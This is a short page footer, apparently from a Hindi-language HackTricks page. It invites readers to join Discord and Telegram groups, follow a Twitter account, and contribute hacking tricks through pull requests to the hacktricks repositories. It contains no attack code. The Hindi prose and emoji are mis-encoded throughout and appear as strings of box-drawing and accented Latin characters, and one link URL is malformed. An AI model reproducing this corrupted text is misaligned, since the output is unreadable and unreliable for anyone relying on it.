* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВред**

</details>
